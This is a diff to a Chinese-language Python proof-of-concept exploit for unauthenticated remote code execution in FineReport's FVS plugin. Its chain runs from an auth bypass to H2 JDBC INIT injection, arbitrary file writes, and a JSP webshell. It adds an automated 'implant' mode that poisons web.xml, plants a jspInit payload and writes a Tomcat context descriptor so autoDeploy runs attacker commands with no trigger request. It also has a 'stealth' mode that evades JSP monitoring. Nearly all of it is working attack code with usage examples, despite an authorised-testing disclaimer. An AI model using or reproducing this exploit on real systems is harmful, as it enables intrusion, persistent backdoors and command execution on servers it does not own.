@@ -6,15 +6,29 @@ FineReport FVS 插件未授权 RCE PoC —— 路线一：H2 数据连接层注�
 配套: poc-attach.py(路线二: 附件层 web.xml 投毒) | 原理见 vulnerability-analysis.md
 影响: FineReport < 11.5.16（FVS/Duchamp 复用资源链路，实验基线 11.5.15 + wysiwyg 4.13.0）
 链路: tplPath 鉴权绕过 → 未授权上传复用包(props.name 注入 H2 JDBC URL 的 INIT)
-      → testConnection 执行 CALL FILE_WRITE 任意文件写 → 写 JSP 至 ROOT webapp
-      （绕过只监控 webroot 的 JSP-Monitor）→ GET 触发 Tomcat 编译执行 → Web 回读
+      → testConnection 执行 CALL FILE_WRITE 任意文件写（任意路径/后缀/大小）
+
+两种模式:
+  交互模式(默认): 写 JSP 至 ROOT webapp（绕过只监控 webroot 的 JSP-Monitor）
+                  → GET ?c=<命令> 触发 Tomcat 编译执行 → 输出落 webroot → 回读
+  植入模式 --implant(全自动, 出厂镜像实测零重启):
+                  枪1 投毒 WEB-INF/web.xml   枪2 WEB-INF/x.env(jspInit, 命令固化)
+                  枪3 Tomcat 上下文描述符 conf/Catalina/localhost/<name>.xml(容器配置)
+                  → autoDeploy(Tomcat 与 FR 镜像默认开启)数秒内自动部署新上下文
+                  → 部署时 Jasper 预编译 x.env → jspInit() 执行 → 输出落 webroot → 回读
+                  (全程无触发请求; --no-desc 可只植入不触发, 等目标重启/重部署)
+
+条件: 目标为 Linux(命令经 /bin/sh 执行); FR 进程对 Tomcat 目录有写权限(官方镜像以 root 运行)。
 
 仅用于授权测试 / 自建靶场。禁止指向生产或他人资产。
 
 用法:
-  python3 poc.py -t http://127.0.0.1:18081                       # 默认命令: 落地标记并回读
-  python3 poc.py -t http://127.0.0.1:18081 -c "id"
-  python3 poc.py -t http://127.0.0.1:18081 --shape stealth       # 高级规避形态(全隐身)
+  python3 poc-h2.py -t http://127.0.0.1:18081                       # 交互: 默认命令, 落地并回读
+  python3 poc-h2.py -t http://127.0.0.1:18081 -c "id"               # 交互: 自定义命令
+  python3 poc-h2.py -t http://127.0.0.1:18081 --shape stealth       # 交互: 高级规避形态(全隐身)
+  python3 poc-h2.py -t http://127.0.0.1:18081 --implant             # 植入: 全自动, 约 45 秒出结果
+  python3 poc-h2.py -t http://127.0.0.1:18081 --implant -c "id"     # 植入: 自定义命令(写入时固化)
+  python3 poc-h2.py -h                                               # 全部参数(--tomcat-home / --no-desc 等)
 形态(均经靶场实测):
   raw      基线
   lower    全小写
@@ -142,9 +156,12 @@ def main():
     ap.add_argument("--jsp-name", default="pwn_fvs.jsp",
                     help="stealth 形态下只需主名(自动拼后缀)")
     ap.add_argument("--implant", action="store_true",
-                    help="植入模式: 两枪写 WEB-INF/web.xml(投毒)+x.env(jspInit), "
-                         "重载时自动执行命令(零触发请求, 任意大小文件)")
-    ap.add_argument("--wait", type=int, default=180, help="植入模式等待重载的最长秒数")
+                    help="植入模式(全自动): 写投毒 web.xml + jspInit + 容器描述符, "
+                         "autoDeploy 自动重载并执行命令(零重启, 零触发请求)")
+    ap.add_argument("--wait", type=int, default=180, help="植入模式等待自动执行的最长秒数")
+    ap.add_argument("--tomcat-home", default="/usr/local/tomcat", help="植入模式: Tomcat 根目录")
+    ap.add_argument("--ctx-name", default="z", help="植入模式: 自动部署的上下文名")
+    ap.add_argument("--no-desc", action="store_true", help="植入模式: 不写容器描述符(仅植入, 等重启)")
     ap.add_argument("--write-dir", default="/usr/local/tomcat/webapps/ROOT",
                     help="JSP 写入目录(ROOT=默认context,避开只盯 webroot 的 JSP-Monitor)")
     a = ap.parse_args()
@@ -161,8 +178,11 @@ def main():
         else a.write_dir.rstrip("/") + "/" + a.jsp_name
     get_name = base_name + ".jsp" if stealth else a.jsp_name
     readback = f"{origin}/webroot/pwn_poc_readback.txt"
-    cmd = a.cmd or (f"(echo PWN-FVS-UNAUTH-RCE; id; hostname; date) > "
-                    f"/usr/local/tomcat/webapps/webroot/pwn_poc_readback.txt 2>&1")
+    if a.cmd:  # 自定义命令: 自动包装成 可回读 形式(输出落 webroot 再取回打印)
+        cmd = f"( {a.cmd} ) > /usr/local/tomcat/webapps/webroot/pwn_poc_readback.txt 2>&1"
+    else:
+        cmd = (f"(echo PWN-FVS-UNAUTH-RCE; id; hostname; date) > "
+               f"/usr/local/tomcat/webapps/webroot/pwn_poc_readback.txt 2>&1")
 
     name, u_esc = payload_name(JSP.encode().hex().upper(), target, a.shape)
     print(f"[*] shape={a.shape}  name={len(name)}B  组件≤{len(name.split('/')[0])}B")
@@ -213,14 +233,13 @@ def main():
     except Exception as e:
         print(f"[3] trigger -> 异常 {e} (JSP 已执行但命令报错也常见, 看回读)")
 
-    # ---- 4) Web 路径回读 ----
-    if not a.cmd:
-        try:
-            st4, d4 = http_req(urllib.parse.urlsplit(readback), timeout=10)
-            print(f"[4] readback-> {st4}\n{'-' * 46}\n"
-                  f"{d4.decode('utf-8', 'replace').strip()}\n{'-' * 46}")
-        except Exception as e:
-            print(f"[4] readback-> 异常 {e}")
+    # ---- 4) Web 路径回读(命令输出) ----
+    try:
+        st4, d4 = http_req(urllib.parse.urlsplit(readback), timeout=10)
+        print(f"[4] readback-> {st4}\n{'-' * 46}\n"
+              f"{d4.decode('utf-8', 'replace').strip()}\n{'-' * 46}")
+    except Exception as e:
+        print(f"[4] readback-> 异常 {e}")
     print("[*] 完成。")
 
 def _fire_one(base, name, timeout=120):
@@ -251,35 +270,56 @@ def _fire_one(base, name, timeout=120):
 
 
 def run_implant(a):
-    """H2 路线的重载驱动植入: 枪1 写投毒 web.xml, 枪2 写 jspInit x.env(任意大小, 组件切块)"""
+    """H2 路线的重载驱动植入(全自动):
+       枪1 投毒 web.xml  枪2 jspInit(x.env)  枪3 Tomcat 上下文描述符(容器配置)
+       枪3 落盘后, HostConfig 的 autoDeploy(Tomcat 与 FR 镜像默认开启)数秒内自动部署新上下文,
+       部署过程中 Jasper 预编译 x.env → jspInit() 执行 —— 无需重启, 无触发请求。"""
     import time
     base = a.target.rstrip("/")
     o = urllib.parse.urlsplit(base)
     origin = f"{o.scheme}://{o.netloc}"
-    web_inf = "/usr/local/tomcat/webapps/webroot/WEB-INF"
+    tomcat = a.tomcat_home.rstrip("/")
+    docbase = tomcat + "/webapps/webroot"
+    web_inf = docbase + "/WEB-INF"
     readback = f"{origin}/webroot/implant_readback.txt"
-    cmd = a.cmd or (f"(echo PWN-H2-IMPLANT; id; hostname; date) > "
-                    f"/usr/local/tomcat/webapps/webroot/implant_readback.txt 2>&1")
-    print("[*] 植入模式: 枪1 web.xml + 枪2 x.env(jspInit), 目标", web_inf)
+    if a.cmd:
+        cmd = f"( {a.cmd} ) > {docbase}/implant_readback.txt 2>&1"
+    else:
+        cmd = (f"(echo PWN-H2-IMPLANT; id; hostname; date) > "
+               f"{docbase}/implant_readback.txt 2>&1")
+    print(f"[*] 植入模式(全自动): 投毒 web.xml + jspInit + 容器描述符 -> {web_inf}")
     r1 = _fire_one(base, chunk_write_name(IMPLANT_WEBXML.encode(), web_inf + "/web.xml"))
-    print(f"[1] web.xml -> {r1}")
+    print(f"[1] web.xml(投毒)   -> {r1}")
     r2 = _fire_one(base, chunk_write_name(make_jsp_init(cmd).encode(), web_inf + "/x.env"))
-    print(f"[2] x.env   -> {r2}")
-    print(f"[3] 等待重载(最长 {a.wait}s)...")
+    print(f"[2] x.env(jspInit)  -> {r2}")
+    if r1 is None or r2 is None:
+        print("    植入文件写入失败, 中止。"); return 1
+    if a.no_desc:
+        print("[3] 已跳过描述符(仅植入): 任何重启/重部署时 jspInit 自动执行。")
+    else:
+        desc = f'<Context docBase="{docbase}" />'
+        target = f"{tomcat}/conf/Catalina/localhost/{a.ctx_name}.xml"
+        r3 = _fire_one(base, chunk_write_name(desc.encode(), target))
+        print(f"[3] 容器描述符      -> {r3}   ({target})")
+        if r3 is None:
+            print("    描述符写入失败: 无法自动触发, 退化为重启/重部署后执行。")
+        else:
+            print(f"[4] 等待 autoDeploy 自动部署并执行(最长 {a.wait}s, 实测 10~60s)...")
     deadline = time.time() + a.wait
     while time.time() < deadline:
         try:
             stp, dp = http_req(urllib.parse.urlsplit(readback), timeout=8)
             if stp == 200 and dp.strip():
-                print("    命令已在重载中执行(零触发请求):")
+                print("    命令已自动执行(零重启, 零触发请求):")
                 print("-" * 46); print(dp.decode("utf-8", "replace").strip()); print("-" * 46)
                 return 0
         except Exception:
             pass
         time.sleep(6)
-    print("    超时: 未发生重载。已植入——任何重启/重部署时 jspInit 自动执行。")
+    print("    超时: 期间未发生重载。已植入——任何重启/重部署时 jspInit 自动执行。")
+    if not a.no_desc:
+        print("    描述符已写却未触发: 确认 --tomcat-home 指向目标 Tomcat 根目录, 且其 autoDeploy 未被关闭。")
     return 2
-
 
 if __name__ == "__main__":
     main()
